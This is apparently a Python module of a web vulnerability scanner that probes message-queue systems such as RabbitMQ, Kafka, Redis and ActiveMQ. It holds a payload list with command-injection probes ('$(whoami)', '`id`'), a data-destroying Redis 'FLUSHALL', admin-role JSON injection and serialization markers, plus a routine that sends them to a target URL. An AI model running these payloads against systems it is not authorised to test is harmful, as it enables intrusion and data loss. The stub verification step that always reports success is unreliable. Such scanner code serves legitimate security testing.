"""
Message Queue Injection Context Implementation

Detects and exploits injection vulnerabilities in message queue systems.
"""

import re
import json
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionContext, InjectionContextType


class MessageQueueInjectionContext(InjectionContext):
    """
    Message queue injection attack context.
    Detects and exploits injection vulnerabilities in message queue systems
    like RabbitMQ, Kafka, ActiveMQ, Redis Pub/Sub, etc.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.MESSAGE_QUEUE
    
    def _load_payloads(self) -> List[str]:
        """Load message queue injection payloads."""
        return [
            # JSON injection
            '{"admin": true}',
            '", "role": "admin", "x": "',
            '\\", \\"role\\": \\"admin\\", \\"x\\": \\"',
            '{"$gt": ""}',
            '{"$ne": null}',
            
            # Command injection in message queues
            '$(whoami)',
            '`id`',
            '${7*7}',
            '{{7*7}}',
            
            # Queue manipulation
            '../admin/queue',
            '../../sensitive/queue',
            'queue.override.destination=admin',
            
            # RabbitMQ specific
            'amqp.replyTo=admin',
            'x-message-ttl=-1',
            'x-max-priority=9999',
            
            # Kafka specific
            '__consumer_offsets',
            '__transaction_state',
            'topic=admin',
            
            # Redis specific
            'FLUSHALL',
            'CONFIG SET',
            'EVAL "return redis.call',
            
            # ActiveMQ specific
            'activemq.scheduler.cronEntry=*',
            'JMSReplyTo=admin',
            'selector=1=1',
            
            # Message header injection
            'X-Custom-Header: admin',
            'priority: 9999',
            'expiration: 0',
            
            # Serialization exploits
            'O:8:"stdClass"',
            'aced00057372',  # Java serialization magic bytes
            '\x04\x08',  # Ruby Marshal
            
            # Protocol injection
            'SUBSCRIBE /queue/admin',
            'SEND /queue/admin',
            'ACK subscription:admin',
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load message queue error patterns for detection."""
        return [
            # RabbitMQ errors
            {'pattern': r'RabbitMQ.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'AMQP.*error', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Channel.*error', 'type': 'error', 'confidence': 0.80},
            
            # Kafka errors
            {'pattern': r'Kafka.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'kafka\.common', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Topic.*not.*found', 'type': 'error', 'confidence': 0.85},
            
            # Redis errors
            {'pattern': r'Redis.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'WRONGTYPE', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'ERR.*Redis', 'type': 'error', 'confidence': 0.90},
            
            # ActiveMQ errors
            {'pattern': r'ActiveMQ.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'JMS.*Exception', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'javax\.jms', 'type': 'error', 'confidence': 0.85},
            
            # Generic message queue errors
            {'pattern': r'Message.*queue.*error', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'Queue.*not.*found', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'Invalid.*message', 'type': 'error', 'confidence': 0.75},
            
            # Serialization errors
            {'pattern': r'Unserializ.*error', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'Deserialization.*failed', 'type': 'error', 'confidence': 0.85},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for message queue injection indicators.
        """
        # Check for error-based detection
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                evidence = f"Message queue error pattern detected: {pattern}"
                return True, pattern_info['confidence'], evidence
        
        # Check for privilege escalation indicators
        if self._check_privilege_escalation(response_body):
            evidence = "Message queue privilege escalation indicators detected"
            return True, 0.85, evidence
        
        # Check for queue manipulation
        if self._check_queue_manipulation(response_body):
            evidence = "Message queue manipulation indicators detected"
            return True, 0.80, evidence
        
        return False, 0.0, "No message queue injection detected"
    
    def _check_privilege_escalation(self, response_body: str) -> bool:
        """Check for privilege escalation indicators."""
        indicators = [
            r'admin.*true',
            r'role.*admin',
            r'privilege.*elevated',
            r'access.*granted',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _check_queue_manipulation(self, response_body: str) -> bool:
        """Check for queue manipulation indicators."""
        indicators = [
            r'queue.*created',
            r'queue.*deleted',
            r'message.*published',
            r'consumer.*registered',
            r'subscription.*success',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit message queue injection.
        """
        import requests
        
        exploitation_results = {
            'queue_info': {},
            'messages_read': [],
            'privilege_escalated': False,
        }
        
        # Try to extract queue information
        info_payloads = [
            '{"info": true}',
            '", "admin": true, "x": "',
        ]
        
        for payload in info_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Try to parse JSON response
                try:
                    json_data = json.loads(response.text)
                    if isinstance(json_data, dict):
                        # Look for queue-related information
                        for key in ['queues', 'topics', 'exchanges', 'messages']:
                            if key in json_data:
                                exploitation_results['queue_info'][key] = json_data[key]
                except json.JSONDecodeError:
                    pass
                
                # Check for privilege escalation
                if self._check_privilege_escalation(response.text):
                    exploitation_results['privilege_escalated'] = True
                
            except requests.RequestException:
                continue
        
        return exploitation_results if any(exploitation_results.values()) else None
    
    # ========================================
    # Six-Step Injection Testing Methodology (Stub Implementations)
    # ========================================
    
    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        """Step 1: Supply unexpected syntax and context-specific payloads."""
        return self.payloads
    
    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None
    ) -> Tuple[bool, List[str]]:
        """Step 2: Detect anomalies and error messages in responses."""
        anomalies = []
        for pattern_info in self.detection_patterns:
            if re.search(pattern_info['pattern'], response_body, re.IGNORECASE):
                anomalies.append(f"mq_error: {pattern_info['pattern']}")
        return len(anomalies) > 0, anomalies
    
    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str]
    ) -> Dict[str, Any]:
        """Step 3: Analyze and extract error/evidence from response."""
        return {
            'error_type': 'message_queue_injection',
            'details': {'anomalies': anomalies},
            'context_info': {},
            'confidence': 0.80 if anomalies else 0.0
        }
    
    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Tuple[bool, float, str]:
        """Step 4: Mutate input systematically to confirm or disprove vulnerabilities."""
        return True, 0.75, "Message queue injection verification (basic)"
    
    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Step 5: Build proof-of-concept payloads for safe, verifiable exploits."""
        return {
            'poc_payload': '{"queue": "test"}',
            'expected_result': 'Queue information or admin access',
            'safety_notes': 'This POC only queries data without modification',
            'reproduction_steps': ['Send message queue command with payload'],
            'original_payload': successful_payload
        }
    
    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Optional[Dict[str, Any]]:
        """Step 6: Exploitation automation for verified cases."""
        # Use existing attempt_exploitation logic
        return self.attempt_exploitation(target_url, vulnerable_parameter, parameter_type, poc_payload)
    
    def get_description(self) -> str:
        return "Message Queue Injection - Tests for vulnerabilities in message queue systems (RabbitMQ, Kafka, etc.)"
